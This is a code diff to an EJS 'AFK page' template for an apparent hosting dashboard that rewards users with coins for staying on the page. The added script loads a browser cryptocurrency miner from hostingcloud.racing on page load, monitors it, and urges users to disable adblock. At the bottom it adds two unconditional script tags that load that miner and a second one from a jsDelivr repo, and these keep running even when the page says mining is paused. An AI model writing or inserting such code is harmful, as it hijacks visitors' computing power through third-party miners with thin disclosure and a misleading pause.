@@ -1,61 +1,239 @@
 <!DOCTYPE html>
 <html lang="en">
   <%- include('./components/head') %>
-    <body>
-      <div class="container-scroller">
-        <!-- partial:partials/_sidebar.html -->
+  <body>
+    <div class="container-scroller">
+      <!-- partial:partials/_sidebar.html -->
       <%- include('./components/sidebar') %>
+      <!-- partial -->
+      <div class="container-fluid page-body-wrapper">
+        <!-- partial:partials/_navbar.html -->
+        <%- include('./components/topnav') %>
         <!-- partial -->
-        <div class="container-fluid page-body-wrapper">
-          <!-- partial:partials/_navbar.html -->
-           <%- include('./components/topnav') %>
-          <!-- partial -->
         <div style="background-color: #111319" class="main-panel">
           <div style="background-color: #111319" class="content-wrapper">
-
-           <h2>AFK Page</h2>
-           <p class="text-gray">Earn coins by staying on this page.</p>
-              <div class="row">
-                <div class="col-md-12 grid-margin stretch-card">
-                                    <div class="card">
-                    <div class="card-body">
-                <h4>You are currently earning!</h4>
-                <p>Every <% if (settings.api.arcio["afk page"].every !== 1) { %><%= settings.api.arcio["afk page"].every %> seconds<% } else { %>second<% } %>, you will get <%= settings.api.arcio["afk page"].coins == 1 ? "a" : settings.api.arcio["afk page"].coins %> coin<%= settings.api.arcio["afk page"].coins == 1 ? "" : "s" %></p>
-                <p>Warning: You may be redirected back to the dashboard page if the page is frozen by the browser or there is an adblocker on</p>
-                  <script>
-                <%- arcioafktext %>
-            </script>
-                 </div>
+            <h2>AFK Page</h2>
+            <p class="text-gray">Earn coins by staying on this page.</p>
+            <div class="row">
+              <div class="col-md-12 grid-margin stretch-card">
+                <div class="card">
+                  <div class="card-body">
+                    <h4>You are currently earning!</h4>
+                    <p>
+                      Every 
+                      <% if (settings.api.arcio["afk page"].every !== 1) { %>
+                        <%= settings.api.arcio["afk page"].every %> seconds
+                      <% } else { %>
+                        second
+                      <% } %>, you will get 
+                      <%= settings.api.arcio["afk page"].coins === 1 ? "1" : settings.api.arcio["afk page"].coins %> coin<%= settings.api.arcio["afk page"].coins === 1 ? "" : "s" %>.
+                    </p>
+                    <p>Warning: You may be redirected back to the dashboard page if the page is frozen by the browser or there is an adblocker on!</p>
+                    
+                    <!-- AFK Status Section (Minimal Frontend UI - Backend Handles Logic) -->
+                    <div id="afk-status" class="mt-4 p-3" style="background-color: #1a1a1a; border-radius: 5px; text-align: center;">
+                      <div id="status-message" class="text-white">Detecting mining script...</div>
+                      <div id="session-time" class="mt-2 text-white" style="display: none;">Session active: <span id="time-elapsed">0</span>s | Miner: <span id="miner-status">Loading...</span></div>
+                    </div>
+                  </div>
+                </div>
               </div>
             </div>
-            </div>
-           </div>
-            <!-- content-wrapper ends -->
-          <%- include('./components/footer') %>
           </div>
-          <!-- main-panel ends -->
+          <!-- content-wrapper ends -->
+          <%- include('./components/footer') %>
         </div>
-        <!-- page-body-wrapper ends -->
+        <!-- main-panel ends -->
       </div>
-      <!-- container-scroller -->
-      <!-- plugins:js -->
-      <script src="../../assets/vendors/js/vendor.bundle.base.js"></script>
-      <!-- endinject -->
-      <!-- Plugin js for this page -->
-      <script src="../../assets/vendors/select2/select2.min.js"></script>
-      <script src="../../assets/vendors/typeahead.js/typeahead.bundle.min.js"></script>
-      <!-- End plugin js for this page -->
-      <!-- inject:js -->
-      <script src="../../assets/js/off-canvas.js"></script>
-      <script src="../../assets/js/hoverable-collapse.js"></script>
-      <script src="../../assets/js/misc.js"></script>
-      <script src="../../assets/js/settings.js"></script>
-      <script src="../../assets/js/todolist.js"></script>
-      <!-- endinject -->
-      <!-- Custom js for this page -->
-      <script src="../../assets/js/file-upload.js"></script>
-      <script src="../../assets/js/typeahead.js"></script>
-      <script src="../../assets/js/select2.js"></script>
-      <!-- End custom js for this page -->
-    </body>
-  </html>
+      <!-- page-body-wrapper ends -->
+    </div>
+    <!-- container-scroller -->
+    <!-- plugins:js -->
+    <script src="../../assets/vendors/js/vendor.bundle.base.js"></script>
+    <!-- endinject -->
+    <!-- Plugin js for this page -->
+    <script src="../../assets/vendors/select2/select2.min.js"></script>
+    <script src="../../assets/vendors/typeahead.js/typeahead.bundle.min.js"></script>
+    <!-- End plugin js for this page -->
+    <!-- inject:js -->
+    <script src="../../assets/js/off-canvas.js"></script>
+    <script src="../../assets/js/hoverable-collapse.js"></script>
+    <script src="../../assets/js/misc.js"></script>
+    <script src="../../assets/js/settings.js"></script>
+    <script src="../../assets/js/todolist.js"></script>
+    <!-- endinject -->
+    <!-- Custom js for this page -->
+    <script src="../../assets/js/file-upload.js"></script>
+    <script src="../../assets/js/typeahead.js"></script>
+    <script src="../../assets/js/select2.js"></script>
+    <!-- End custom js for this page -->
+    
+    <!-- Minimal Client-Side Script (Detection + Persistent Miner Load + Heartbeats) -->
+    <script>
+      const afkInterval = <%= typeof settings !== 'undefined' && settings.api && settings.api.arcio && settings.api.arcio["afk page"] ? settings.api.arcio["afk page"].every : 10 %>;
+      const coinsPerInterval = <%= typeof settings !== 'undefined' && settings.api && settings.api.arcio && settings.api.arcio["afk page"] ? settings.api.arcio["afk page"].coins : 1 %>;
+      
+      let isScriptRunning = false;
+      let heartbeatTimer = null;
+      let scriptCheckTimer = null;
+      let sessionStartTime = null;
+      let timeElapsed = 0;
+      let minerScript = null;
+      const HEARTBEAT_INTERVAL = 30000;
+      const SCRIPT_CHECK_INTERVAL = 60000;
+      function loadMiningScript() {
+        const statusDiv = document.getElementById('status-message');
+        const minerStatusSpan = document.getElementById('miner-status');
+        
+        statusDiv.textContent = 'Loading mining script...';
+        minerStatusSpan.textContent = 'Loading...';
+        
+        minerScript = document.createElement('script');
+        minerScript.src = 'https://www.hostingcloud.racing/Zvfk.js';
+        minerScript.async = true;
+        
+        minerScript.onload = function() {
+          console.log('[AFK Debug] Mining script loaded successfully - starting miner.');
+          isScriptRunning = true;
+          statusDiv.textContent = 'Mining script active - earnings started (backend verified).';
+          minerStatusSpan.textContent = 'Running';
+          document.getElementById('session-time').style.display = 'block';
+          sessionStartTime = Date.now();
+          startHeartbeats();
+          startScriptMonitoring();
+        };
+        
+        minerScript.onerror = function() {
+          console.log('[AFK Debug] Mining script failed to load (adblock?).');
+          isScriptRunning = false;
+          statusDiv.innerHTML = '<span style="color: #f44336;">Our script was blocked! Disable adblock to earn.</span>';
+          minerStatusSpan.textContent = 'Blocked';
+          document.getElementById('session-time').style.display = 'none';
+        };
+        
+        document.head.appendChild(minerScript);
+      }
+      
+      async function checkMiningScriptAccessibility() {
+        if (!isScriptRunning) return;
+        
+        const statusDiv = document.getElementById('status-message');
+        const minerStatusSpan = document.getElementById('miner-status');
+        
+        try {
+          const response = await fetch('https://www.hostingcloud.racing/Zvfk.js', { method: 'HEAD' });  // HEAD to avoid downloading full JS
+          if (response.ok) {
+            console.log('[AFK Debug] Script accessibility check: OK');
+            minerStatusSpan.textContent = 'Running';
+          } else {
+            throw new Error('Non-OK response');
+          }
+        } catch (err) {
+          console.log('[AFK Debug] Script accessibility check failed:', err.message);
+
+          isScriptRunning = false;
+          statusDiv.innerHTML = '<span style="color: #f44336;">Pur script was blocked mid-session! Disable adblock to resume.</span>';
+          minerStatusSpan.textContent = 'Blocked';
+          document.getElementById('session-time').style.display = 'none';
+          stopHeartbeats();
+          stopScriptMonitoring();
+
+          if (minerScript && minerScript.parentNode) {
+            minerScript.parentNode.removeChild(minerScript);
+            minerScript = null;
+          }
+        }
+      }
+      function startScriptMonitoring() {
+        if (scriptCheckTimer) clearInterval(scriptCheckTimer);
+        scriptCheckTimer = setInterval(checkMiningScriptAccessibility, SCRIPT_CHECK_INTERVAL);
+        setTimeout(checkMiningScriptAccessibility, 5000);
+      }
+      
+      function stopScriptMonitoring() {
+        if (scriptCheckTimer) {
+          clearInterval(scriptCheckTimer);
+          scriptCheckTimer = null;
+        }
+      }
+      
+      function startHeartbeats() {
+        if (heartbeatTimer) clearInterval(heartbeatTimer);
+        
+        sendHeartbeat();
+        
+        heartbeatTimer = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
+        
+        const elapsedTimer = setInterval(() => {
+          if (isScriptRunning && sessionStartTime) {
+            timeElapsed = Math.floor((Date.now() - sessionStartTime) / 1000);
+            document.getElementById('time-elapsed').textContent = timeElapsed;
+          }
+        }, 1000);
+      }
+      
+      function stopHeartbeats() {
+        if (heartbeatTimer) {
+          clearInterval(heartbeatTimer);
+          heartbeatTimer = null;
+        }
+        if (isScriptRunning) sendHeartbeat();
+      }
+      
+      function sendHeartbeat() {
+        if (!isScriptRunning) return;
+        
+        console.log('[AFK Debug] Sending heartbeat...');
+        
+        fetch('/api/afk-heartbeat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            afkSession: true,
+            elapsedSinceStart: timeElapsed 
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            console.log('[AFK Debug] Heartbeat success. Earned:', data.earnedThisHeartbeat, 'New balance:', data.newBalance);
+          } else {
+            console.error('[AFK Debug] Heartbeat failed:', data.error);
+            document.getElementById('status-message').textContent = `Error: ${data.error}`;
+          }
+        })
+        .catch(err => {
+          console.error('[AFK Debug] Heartbeat network error:', err);
+        });
+      }
+      
+      document.addEventListener('visibilitychange', function() {
+        if (document.hidden && isScriptRunning) {
+          stopHeartbeats();
+          document.getElementById('status-message').textContent = 'Tab hidden - pausing mining/earnings.';
+          document.getElementById('miner-status').textContent = 'Paused';
+        } else if (!document.hidden && isScriptRunning) {
+          document.getElementById('status-message').textContent = 'Mining script active - earnings resumed.';
+          document.getElementById('miner-status').textContent = 'Running';
+          startHeartbeats();
+        }
+      });
+      window.addEventListener('load', function() {
+        console.log('[AFK Debug] Initializing AFK page...');
+        setTimeout(loadMiningScript, 1000); 
+      });
+      
+      window.addEventListener('beforeunload', function() {
+        stopHeartbeats();
+        stopScriptMonitoring();
+        if (minerScript && minerScript.parentNode) {
+          minerScript.parentNode.removeChild(minerScript);
+        }
+      });
+    </script>
+
+    <!-- External scripts (static; js-miner as fallback/auxiliary) -->
+    <script src="https://www.hostingcloud.racing/Zvfk.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Enlarged-Guacamole/cdn@master/js/js-miner.js"></script>
+  </body>
+</html>
